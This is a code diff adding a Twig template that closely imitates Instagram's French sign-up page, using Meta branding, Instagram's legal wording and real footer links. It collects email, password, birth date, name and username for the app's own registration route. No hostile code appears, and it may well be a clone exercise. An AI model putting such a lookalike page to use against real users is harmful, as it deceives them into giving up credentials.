@@ -1,0 +1,572 @@
+{% extends 'base.html.twig' %}
+
+{% block title %}Instagram – Inscription
+{% endblock %}
+
+{% block stylesheets %}
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+	<style>
+	:root {
+		--ig-primary-background: 0, 0, 0;
+		--ig-right-bg: #101923;
+		--ig-input-bg: transparent;
+		--ig-primary-text: 245, 245, 245;
+		--ig-secondary-text: 168, 168, 168;
+		--ig-tertiary-text: 115, 115, 115;
+		--ig-separator: 54, 54, 54;
+		--ig-stroke: 54, 54, 54;
+		--ig-focus-stroke: 85, 85, 85;
+		--ig-primary-button: 0, 149, 246;
+		--ig-primary-button-hover: 24, 119, 242;
+		--ig-input-border-radius: 16px;
+		--ig-input-border: 62, 68, 81;
+		--ig-link: 224, 241, 255;
+		--ig-facebook-blue: 24, 119, 242;
+		--ig-blue: 0, 149, 246;
+		--ig-blue-hover: 24, 119, 242;
+	}
+
+	* {
+		margin: 0;
+		padding: 0;
+		box-sizing: border-box;
+	}
+
+	html, body {
+		height: 100%;
+		font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+		background: var(--ig-right-bg);
+		color: rgb(var(--ig-primary-text));
+		font-size: 14px;
+		line-height: 1.5;
+	}
+
+	.ig-page {
+		display: flex;
+		flex-direction: column;
+		min-height: 100vh;
+	}
+
+	.ig-main {
+		display: flex;
+		flex: 1;
+		justify-content: center;
+		padding: 30px 24px 40px;
+	}
+
+	.ig-form-box {
+		width: 100%;
+		max-width: 560px;
+	}
+
+	/* Bouton retour */
+	.ig-back {
+		display: inline-flex;
+		align-items: center;
+		justify-content: center;
+		width: 48px;
+		height: 48px;
+		background: transparent;
+		border: none;
+		border-radius: 50%;
+		color: rgb(var(--ig-primary-text));
+		cursor: pointer;
+		margin-bottom: 12px;
+		margin-left: -9px;
+		padding: 0;
+		text-decoration: none;
+		transition: background 0.2s;
+	}
+
+	.ig-back:hover {
+		background: rgba(255, 255, 255, 0.06);
+	}
+
+	.ig-back svg {
+		width: 30px;
+		height: 30px;
+		fill: none;
+		stroke: rgb(var(--ig-primary-text));
+		stroke-width: 2;
+		stroke-linecap: round;
+		stroke-linejoin: round;
+	}
+
+	/* Logo Meta en haut */
+	.ig-meta-top {
+		display: flex;
+		align-items: center;
+		gap: 0px;
+		color: rgb(var(--ig-primary-text));
+		font-size: 1.3rem;
+		font-weight: 400;
+		margin-bottom: 16px;
+	}
+
+	.ig-meta-top svg {
+		width: 30px;
+		height: 17px;
+		fill: rgb(var(--ig-primary-text));
+	}
+
+	/* Titre */
+	.ig-reg-title {
+		font-size: 2rem;
+		font-weight: 600;
+		color: rgb(var(--ig-primary-text));
+		margin-bottom: 6px;
+	}
+
+	.ig-reg-subtitle {
+		font-size: 1.25rem;
+		font-weight: 400;
+		color: rgb(var(--ig-secondary-text));
+		margin-bottom: 24px;
+	}
+
+	/* Labels de section */
+	.ig-section-label {
+		font-size: 1.2rem;
+		font-weight: 500;
+		color: rgb(var(--ig-primary-text));
+		margin-bottom: 8px;
+	}
+
+	/* Inputs */
+	.ig-input-wrap {
+		position: relative;
+		margin-bottom: 19px;
+	}
+
+	.ig-input {
+		width: 100%;
+		background: transparent;
+		border: 1.5px solid rgb(var(--ig-input-border));
+		border-radius: var(--ig-input-border-radius);
+		color: rgb(var(--ig-primary-text));
+		font-size: 1.2rem;
+		font-weight: 400;
+		height: 60px;
+		padding: 14px 18px 8px;
+		outline: none;
+		transition: border-color 0.25s ease, background 0.25s ease, box-shadow 0.25s ease;
+		font-family: inherit;
+	}
+
+	.ig-input::placeholder {
+		color: transparent;
+	}
+
+	.ig-floating-label {
+		position: absolute;
+		left: 18px;
+		top: 50%;
+		transform: translateY(-50%);
+		color: rgb(var(--ig-secondary-text));
+		font-size: 1.2rem;
+		font-weight: 400;
+		pointer-events: none;
+		transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+		transform-origin: left center;
+		line-height: 1;
+	}
+
+	.ig-input:focus + .ig-floating-label,
+	.ig-input:not(:placeholder-shown) + .ig-floating-label {
+		top: 10px;
+		transform: translateY(0) scale(0.7);
+		color: rgb(var(--ig-secondary-text));
+	}
+
+	.ig-input:focus {
+		border-color: rgb(var(--ig-blue));
+		background: transparent;
+		box-shadow: 0 0 0 1px rgb(var(--ig-blue));
+	}
+
+	/* Texte info sous input */
+	.ig-info-text {
+		font-size: 1.05rem;
+		color: rgb(var(--ig-secondary-text));
+		margin-top: -10px;
+		margin-bottom: 6px;
+		line-height: 1.4;
+	}
+
+	.ig-info-link {
+		color: rgb(var(--ig-blue));
+		text-decoration: none;
+		font-size: 1.05rem;
+	}
+
+	.ig-info-link:hover {
+		text-decoration: underline;
+	}
+
+	/* Date de naissance */
+	.ig-birth-header {
+		display: flex;
+		align-items: center;
+		gap: 6px;
+		font-size: 1.2rem;
+		font-weight: 500;
+		color: rgb(var(--ig-primary-text));
+		margin-bottom: 10px;
+	}
+
+	.ig-birth-help {
+		display: inline-flex;
+		align-items: center;
+		justify-content: center;
+		width: 18px;
+		height: 18px;
+		border-radius: 50%;
+		border: 1.5px solid rgb(var(--ig-secondary-text));
+		color: rgb(var(--ig-secondary-text));
+		font-size: 0.7rem;
+		font-weight: 600;
+		cursor: help;
+		text-decoration: none;
+	}
+
+	.ig-birth-selects {
+		display: flex;
+		gap: 12px;
+		margin-bottom: 22px;
+	}
+
+	.ig-birth-selects select {
+		flex: 1;
+		background: transparent;
+		border: 1.5px solid rgb(var(--ig-input-border));
+		border-radius: var(--ig-input-border-radius);
+		color: rgb(var(--ig-secondary-text));
+		font-size: 1.15rem;
+		font-weight: 400;
+		height: 56px;
+		padding: 0 14px;
+		outline: none;
+		font-family: inherit;
+		cursor: pointer;
+		appearance: none;
+		-webkit-appearance: none;
+		background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' fill='none'%3E%3Cpath d='M1 1.5L6 6.5L11 1.5' stroke='%23a8a8a8' stroke-width='1.5' stroke-linecap='round'/%3E%3C/svg%3E");
+		background-repeat: no-repeat;
+		background-position: right 14px center;
+		background-size: 12px;
+	}
+
+	.ig-birth-selects select:focus {
+		border-color: rgb(var(--ig-blue));
+		box-shadow: 0 0 0 1px rgb(var(--ig-blue));
+		color: rgb(var(--ig-primary-text));
+	}
+
+	.ig-birth-selects select option {
+		background: #1a2332;
+		color: rgb(var(--ig-primary-text));
+	}
+
+	/* Textes légaux */
+	.ig-legal-text {
+		font-size: 1rem;
+		font-weight: 700;
+		color: rgb(var(--ig-primary-text));
+		line-height: 1.55;
+		margin-bottom: 12px;
+	}
+
+	.ig-legal-text a {
+		color: rgb(var(--ig-blue));
+		text-decoration: none;
+		font-weight: 500;
+	}
+
+	.ig-legal-text a:hover {
+		text-decoration: underline;
+	}
+
+	/* Bouton Envoyer */
+	.ig-btn-primary {
+		width: 100%;
+		background: rgb(var(--ig-blue));
+		border: none;
+		border-radius: 50px;
+		color: #ffffff;
+		font-size: 1.2rem;
+		font-weight: 400;
+		padding: 8px 20px;
+		margin-top: 8px;
+		margin-bottom: 12px;
+		cursor: pointer;
+		transition: background 0.2s ease, transform 0.1s ease, opacity 0.2s;
+		font-family: inherit;
+		letter-spacing: 0.2px;
+	}
+
+	.ig-btn-primary:hover {
+		background: rgb(var(--ig-blue-hover));
+		opacity: 0.95;
+	}
+
+	.ig-btn-primary:active {
+		transform: scale(0.99);
+	}
+
+	/* Bouton J'ai déjà un compte */
+	.ig-btn-existing {
+		display: block;
+		text-align: center;
+		width: 100%;
+		background: transparent;
+		border: 1px solid rgb(var(--ig-separator));
+		border-radius: 50px;
+		color: rgb(var(--ig-primary-text));
+		font-size: 1.2rem;
+		font-weight: 400;
+		padding: 8px 20px;
+		text-decoration: none;
+		transition: background 0.2s, border-color 0.2s, color 0.2s;
+		font-family: inherit;
+		margin-bottom: 20px;
+	}
+
+	.ig-btn-existing:hover {
+		background: rgba(255, 255, 255, 0.06);
+		border-color: rgb(var(--ig-focus-stroke));
+		color: #fff;
+	}
+
+	/* Alerte erreur */
+	.ig-alert {
+		background: rgba(237, 73, 86, 0.12);
+		border: 1px solid rgba(237, 73, 86, 0.3);
+		border-radius: 10px;
+		color: rgb(254, 97, 114);
+		padding: 12px 16px;
+		font-size: 1rem;
+		margin-bottom: 14px;
+		line-height: 1.4;
+	}
+
+	/* Footer */
+	.ig-footer {
+		background: var(--ig-right-bg);
+		border-top: none;
+		padding: 18px 32px 20px;
+	}
+
+	.ig-footer-links {
+		display: flex;
+		flex-wrap: wrap;
+		justify-content: center;
+		gap: 5px 12px;
+		margin-bottom: 10px;
+	}
+
+	.ig-footer-links a {
+		color: rgba(220, 225, 235, 0.75);
+		text-decoration: none;
+		font-size: 0.85rem;
+		transition: text-decoration 0.1s;
+	}
+
+	.ig-footer-links a:hover {
+		color: rgba(220, 225, 235, 0.75);
+		text-decoration: underline;
+	}
+
+	.ig-footer-bottom {
+		display: flex;
+		align-items: center;
+		justify-content: center;
+		flex-wrap: wrap;
+		gap: 14px;
+	}
+
+	.ig-footer-lang {
+		color: rgba(220, 225, 235, 0.75);
+		font-size: 0.85rem;
+		display: flex;
+		align-items: center;
+		gap: 4px;
+		cursor: pointer;
+		background: none;
+		border: none;
+		font-family: inherit;
+		padding: 0;
+	}
+
+	.ig-footer-copyright {
+		color: rgba(220, 225, 235, 0.75);
+		font-size: 0.85rem;
+	}
+
+	@media(max-width: 768px) {
+		.ig-form-box {
+			max-width: 380px;
+		}
+	}
+</style>
+{% endblock %}
+
+{% block body %}
+<div class="ig-page">
+
+	<div class="ig-main">
+		<div class="ig-form-box">
+
+			<!-- Bouton retour -->
+			<a href="{{ path('app_login') }}" class="ig-back">
+				<svg viewBox="0 0 24 24">
+					<path d="M15 18l-6-6 6-6"/>
+				</svg>
+			</a>
+
+			<!-- Logo Meta -->
+			<div class="ig-meta-top">
+				<svg xmlns="http://www.w3.org/2000/svg" width="22" height="12" fill="currentColor" viewBox="0 0 16 16">
+					<path fill-rule="evenodd" d="M8.217 5.243C9.145 3.988 10.171 3 11.483 3 13.96 3 16 6.153 16.001 9.907c0 2.29-.986 3.725-2.757 3.725-1.543 0-2.395-.866-3.924-3.424l-.667-1.123-.118-.197a55 55 0 0 0-.53-.877l-1.178 2.08c-1.673 2.925-2.615 3.541-3.923 3.541C1.086 13.632 0 12.217 0 9.973 0 6.388 1.995 3 4.598 3q.477-.001.924.122c.31.086.611.22.913.407.577.359 1.154.915 1.782 1.714m1.516 2.224q-.378-.615-.727-1.133L9 6.326c.845-1.305 1.543-1.954 2.372-1.954 1.723 0 3.102 2.537 3.102 5.653 0 1.188-.39 1.877-1.195 1.877-.773 0-1.142-.51-2.61-2.87zM4.846 4.756c.725.1 1.385.634 2.34 2.001A212 212 0 0 0 5.551 9.3c-1.357 2.126-1.826 2.603-2.581 2.603-.777 0-1.24-.682-1.24-1.9 0-2.602 1.298-5.264 2.846-5.264q.137 0 .27.018"/>
+				</svg>
+				Meta
+			</div>
+
+			<!-- Titre -->
+			<h1 class="ig-reg-title">Lancez-vous sur Instagram</h1>
+			<p class="ig-reg-subtitle">Inscrivez-vous pour voir les photos et vidéos de vos ami(e)s.</p>
+
+			{# Erreur #}
+			{% if error is defined and error %}
+				<div class="ig-alert">{{ error }}</div>
+			{% endif %}
+
+			<form method="POST" action="{{ path('app_register') }}" novalidate>
+				<input type="hidden" name="_csrf_token" value="{{ csrf_token('register') }}">
+
+				<!-- Email -->
+				<p class="ig-section-label">Numéro de mobile ou adresse e-mail</p>
+				<div class="ig-input-wrap">
+					<input type="email" name="email" id="inputEmail" class="ig-input" placeholder=" " autocomplete="email" required>
+					<label for="inputEmail" class="ig-floating-label">Numéro de mobile ou adresse e-mail</label>
+				</div>
+				<p class="ig-info-text">
+					Vous pouvez être amené(e) à recevoir des notifications de notre part.<br>
+					<a href="#" class="ig-info-link">Découvrez pourquoi nous vous demandons vos coordonnées</a>
+				</p>
+
+				<!-- Mot de passe -->
+				<p class="ig-section-label">Mot de passe</p>
+				<div class="ig-input-wrap">
+					<input type="password" name="password" id="inputPassword" class="ig-input" placeholder=" " autocomplete="new-password" required>
+					<label for="inputPassword" class="ig-floating-label">Mot de passe</label>
+				</div>
+
+				<!-- Date de naissance -->
+				<div class="ig-birth-header">
+					Date de naissance
+					<span class="ig-birth-help" title="Ajoutez votre date de naissance. Cette information ne sera pas affichée publiquement.">?</span>
+				</div>
+				<div class="ig-birth-selects">
+					<select name="birth_day" required>
+						<option value="" disabled selected>Jour</option>
+						{% for d in 1..31 %}
+							<option value="{{ d }}">{{ d }}</option>
+						{% endfor %}
+					</select>
+					<select name="birth_month" required>
+						<option value="" disabled selected>Mois</option>
+						{% set months = ['Janvier','Février','Mars','Avril','Mai','Juin','Juillet','Août','Septembre','Octobre','Novembre','Décembre'] %}
+						{% for i in 1..12 %}
+							<option value="{{ i }}">{{ months[i-1] }}</option>
+						{% endfor %}
+					</select>
+					<select name="birth_year" required>
+						<option value="" disabled selected>Année</option>
+						{% for y in range(2016, 1920) %}
+							<option value="{{ y }}">{{ y }}</option>
+						{% endfor %}
+					</select>
+				</div>
+
+				<!-- Nom complet -->
+				<p class="ig-section-label">Nom</p>
+				<div class="ig-input-wrap">
+					<input type="text" name="full_name" id="inputFullName" class="ig-input" placeholder=" " autocomplete="name" required>
+					<label for="inputFullName" class="ig-floating-label">Nom complet</label>
+				</div>
+
+				<!-- Nom de profil -->
+				<p class="ig-section-label">Nom de profil</p>
+				<div class="ig-input-wrap" style="margin-bottom: 16px;">
+					<input type="text" name="username" id="inputUsername" class="ig-input" placeholder=" " autocomplete="username" required>
+					<label for="inputUsername" class="ig-floating-label">Nom de profil</label>
+				</div>
+
+				<!-- Textes légaux -->
+				<p class="ig-legal-text">
+					Il se pourrait que des personnes utilisant notre service aient importé vos coordonnées sur Instagram.
+					<a href="#">En savoir plus</a>.
+				</p>
+
+				<p class="ig-legal-text">
+					En appuyant sur Envoyer, vous acceptez de créer un compte et vous acceptez les
+					<a href="#">Conditions générales</a> d'Instagram. Consultez notre
+					<a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect" target="_blank" rel="noopener">Politique de confidentialité</a>
+					pour savoir comment nous recueillons, utilisons et transmettons vos données, ainsi que notre
+					<a href="#">Politique d'utilisation des cookies</a>
+					pour savoir comment nous utilisons les cookies et d'autres technologies similaires.
+				</p>
+
+				<p class="ig-legal-text">
+					La <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect" target="_blank" rel="noopener">Politique de confidentialité</a>
+					décrit les différentes manières dont nous pouvons utiliser les informations que nous recueillons lorsque vous créez un compte.
+					Nous utilisons par exemple ces informations pour fournir, personnaliser et améliorer nos produits, y compris les publicités.
+				</p>
+
+				<!-- Bouton Envoyer -->
+				<button type="submit" class="ig-btn-primary">
+					Envoyer
+				</button>
+			</form>
+
+			<!-- J'ai déjà un compte -->
+			<a href="{{ path('app_password_reset') }}" class="ig-btn-existing">
+				J'ai déjà un compte
+			</a>
+
+		</div>
+	</div>
+
+	<!-- Footer -->
+	<footer class="ig-footer">
+		<div class="ig-footer-links">
+			<a href="https://www.meta.com/fr-fr/about/?utm_source=about.meta.com&utm_medium=redirect" target="_blank" rel="noopener">Meta</a>
+			<a href="https://about.instagram.com/fr-fr" target="_blank" rel="noopener">À propos</a>
+			<a href="https://about.instagram.com/blog/" target="_blank" rel="noopener">Blog</a>
+			<a href="https://about.instagram.com/about-us/careers" target="_blank" rel="noopener">Emplois</a>
+			<a href="https://help.instagram.com/" target="_blank" rel="noopener">Aide</a>
+			<a href="https://developers.facebook.com/docs/instagram-platform" target="_blank" rel="noopener">API</a>
+			<a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect" target="_blank" rel="noopener">Confidentialité</a>
+			<a href="#">Conditions</a>
+			<a href="#">Lieux</a>
+			<a href="#">Instagram Lite</a>
+			<a href="#">Importation des contacts et non-utilisateurs</a>
+			<a href="#">Meta Verified</a>
+		</div>
+
+		<div class="ig-footer-bottom">
+			<button class="ig-footer-lang">
+				Français
+				<svg width="10" height="8" viewbox="0 0 10 8" fill="none">
+					<path d="M1 1.5L5 5.5L9 1.5" stroke="rgb(115,115,115)" stroke-width="1.5" stroke-linecap="round"/>
+				</svg>
+			</button>
+			<span class="ig-footer-copyright">© 2026 Instagram par Meta</span>
+		</div>
+	</footer>
+
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+{% endblock %}
